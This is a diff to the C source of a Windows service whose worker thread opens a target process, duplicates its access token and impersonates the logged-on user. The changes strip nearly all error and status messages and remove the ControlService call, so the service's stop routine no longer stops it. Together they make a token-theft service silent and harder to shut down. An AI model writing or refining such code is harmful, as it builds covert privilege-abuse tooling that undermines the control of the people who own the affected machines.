@@ -37,14 +37,12 @@ int InstallService()
 
     if (!GetModuleFileName(NULL, szPath, MAX_PATH))
     {
-        _tprintf(_T("Cannot get module filename (%lu)\n"), GetLastError());
         return 0;
     }
 
     schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (NULL == schSCManager)
     {
-        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
         return 0;
     }
 
@@ -65,12 +63,9 @@ int InstallService()
 
     if (schService == NULL)
     {
-        _tprintf(_T("CreateService failed (%lu)\n"), GetLastError());
         CloseServiceHandle(schSCManager);
         return 0;
     }
-
-    _tprintf(_T("Service installed successfully\n"));
     CloseServiceHandle(schService);
     CloseServiceHandle(schSCManager);
     return 1;
@@ -130,22 +125,15 @@ int StopService()
     schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (schSCManager == NULL)
     {
-        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
         return 0;
     }
 
     schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
     if (schService == NULL)
     {
-        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
         CloseServiceHandle(schSCManager);
         return 0;
     }
-
-    if (!ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
-        _tprintf(_T("ControlService failed (%lu)\n"), GetLastError());
-    else
-        _tprintf(_T("Service stopped successfully\n"));
 
     CloseServiceHandle(schService);
     CloseServiceHandle(schSCManager);
@@ -160,14 +148,12 @@ int DeleteService()
     schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (schSCManager == NULL)
     {
-        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
         return 0;
     }
 
     schService = OpenService(schSCManager, SERVICE_NAME, DELETE);
     if (schService == NULL)
     {
-        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
         CloseServiceHandle(schSCManager);
         return 0;
     }
@@ -195,7 +181,6 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
     if (g_StatusHandle == NULL)
     {
-        _tprintf(_T("RegisterServiceCtrlHandler failed (%lu)\n"), GetLastError());
         return;
     }
 
@@ -206,7 +191,6 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     g_ServiceStatus.dwWin32ExitCode = 0;
     if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
     {
-        _tprintf(_T("SetServiceStatus failed (%lu)\n"), GetLastError());
         if (g_ServiceStopEvent)
             CloseHandle(g_ServiceStopEvent);
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
@@ -217,7 +201,6 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     if (g_ServiceStopEvent == NULL)
     {
         DWORD dwError = GetLastError();
-        _tprintf(_T("CreateEvent failed (%lu)\n"), dwError);
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
         g_ServiceStatus.dwWin32ExitCode = dwError;
         g_ServiceStatus.dwCheckPoint = 1;
@@ -231,7 +214,6 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
     if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
     {
-        _tprintf(_T("SetServiceStatus (SERVICE_RUNNING) failed (%lu)\n"), GetLastError());
         if (g_ServiceStopEvent)
             CloseHandle(g_ServiceStopEvent);
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
@@ -246,7 +228,6 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     }
     else
     {
-        _tprintf(_T("CreateThread failed (%lu)\n"), GetLastError());
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
     }
 
@@ -298,14 +279,12 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
     DWORD sessionId = WTSGetActiveConsoleSessionId();
     if (sessionId == 0xFFFFFFFF)
     {
-        _tprintf(_T("Failed to get active console session ID (%lu)\n"), GetLastError());
         return ERROR_PROCESS_ABORTED;
     }
 
     HANDLE htoken = NULL;
     if (!WTSQueryUserToken(sessionId, &htoken))
     {
-        _tprintf(_T("WTSQueryUserToken failed (%lu)\n"), GetLastError());
         return ERROR_PROCESS_ABORTED;
     }
 
@@ -314,33 +293,28 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
     DWORD pid = FindTargetPID(targetProcess);
     if (pid == 0)
     {
-        _tprintf(_T("Target process not found.\n"));
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
     }
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (!hProcess)
 	{
-		wprintf(_T("OpenProcess failed (%lu)\n"), GetLastError());
 		return 1;
 	}
     if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &htoken))
     {
-        _tprintf(_T("OpenProcessToken failed (%lu)\n"), GetLastError());
         CloseHandle(hProcess);
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
     }
     if (!DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &htoken))
     {
-        _tprintf(_T("DuplicateTokenEx failed (%lu)\n"), GetLastError());
         CloseHandle(hProcess);
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
     }
     if (!ImpersonateLoggedOnUser(htoken))
     {
-        _tprintf(_T("ImpersonateLoggedOnUser failed (%lu)\n"), GetLastError());
         CloseHandle(hProcess);
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
@@ -403,7 +377,6 @@ int _tmain(int argc, TCHAR *argv[])
 
         if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
         {
-            _tprintf(_T("StartServiceCtrlDispatcher failed (%lu)\n"), GetLastError());
             return 1;
         }
         return 0;
@@ -416,7 +389,7 @@ int _tmain(int argc, TCHAR *argv[])
     }
     
 	if (_tcscmp(argv[1], _T("install")) == 0)
-	{
+	{ 
 		_tprintf(_T("Installing service...\n"));
 		if (!InstallService())
 		{
